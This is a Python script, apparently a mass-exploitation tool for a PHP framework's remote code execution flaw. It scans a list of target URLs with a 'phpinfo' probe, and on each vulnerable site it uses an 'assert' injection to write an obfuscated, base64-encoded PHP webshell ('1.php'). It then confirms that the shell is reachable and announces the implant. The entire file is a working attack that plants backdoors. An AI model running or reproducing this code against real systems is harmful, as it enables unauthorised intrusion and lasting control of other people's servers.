# -*- ccdeing:utf-8 -*-
import requests

requests.packages.urllib3.disable_warnings()
php = 'disable_fun'
text = '/index/login/register.html/?s=index'
prox = {
    'http': 'http://127.0.0.1:7890',
    'https': 'https://127.0.0.1:7890'
}
payload = {
    "_method": "__construct",
    "method": "get",
    "filter[]": "phpinfo",
    "get[]": "-1"
}
# exp = ""
exp = {
    "s": "file_put_contents('1.php',base64_decode('PD9waHAKCWVjaG8gJ25pZSc7CglldmFsKHVuc2VyaWFsaXplKCdzOjI6ImVjIjsnKVswXS51bnNlcmlhbGl6ZSgnczo0OiJhY2R2IjsnKVszXS51bnNlcmlhbGl6ZSgnczozOiJhYTEiOycpWzFdLnVuc2VyaWFsaXplKCdzOjI6IjFsIjsnKVsxXS51bnNlcmlhbGl6ZSgnczo0OiIoMXEpIjsnKVswXS51bnNlcmlhbGl6ZSgnczoxOiIkIjsnKS51bnNlcmlhbGl6ZSgnczozOiJfLV8iOycpWzJdLnVuc2VyaWFsaXplKCdzOjQ6IjNzUGEiOycpWzJdLnVuc2VyaWFsaXplKCdzOjE6Ik8iOycpLnVuc2VyaWFsaXplKCdzOjE6IlMiOycpLnVuc2VyaWFsaXplKCdzOjE6IlQiOycpLnVuc2VyaWFsaXplKCdzOjQ6IlthM3MiOycpWzBdLnVuc2VyaWFsaXplKCdzOjE6IjEiOycpLnVuc2VyaWFsaXplKCdzOjE6Il0iOycpLnVuc2VyaWFsaXplKCdzOjE6IikiOycpLnVuc2VyaWFsaXplKCdzOjE6IjsiOycpKTsKPz4='))",
    "_method": "__construct",
    "method": "POST",
    "filter[]": "assert"
}


def icon():
    print("   ╔═╗   ╔═╗  ╔══════════╗                ")
    print("   ║ ║   ║ ║  ║  ╔═══════╝                ")
    print("   ║ ╚═══╝ ║  ║  ╚═══════╗                ")
    print("   ╚══╗ ╔══╝  ║  ╔═══════╝                ")
    print("      ║ ║     ║  ║     ╔══╗ ╔═══ ╔═══╗    ")
    print("      ║ ║     ║  ║     ╚══╗ ╠═══ ║        ")
    print("      ╚═╝     ╚══╝     ╚══╝ ╚═══ ╚═══╝    ")


def main():
    with open('1.txt', 'r') as f:
        for i in f:
            try:
                a = i
                i = i.replace('\n', '')
                i = str(i + text)
                te = requests.post(i, data=payload, timeout=10, verify=False, proxies=prox)
                gr = str(te.content.decode())
                if php in gr:
                    # print(i+'存在漏洞')
                    muma(a, i)
                else:
                    pass
                    # print(i+'不存在漏洞')
            except:
                pass
                # print(i + '    SSL is Worry!!!')


def muma(a, i):
    res = requests.post(url=i, data=exp, verify=False, proxies=prox, timeout=10)
    path = a.replace('\n', '') + '/1.php'
    tie = requests.get(path)
    if tie.status_code == 200:
        print(path + ' 老爹你儿子上线了！！！')


if __name__ == '__main__':
    icon()
    main()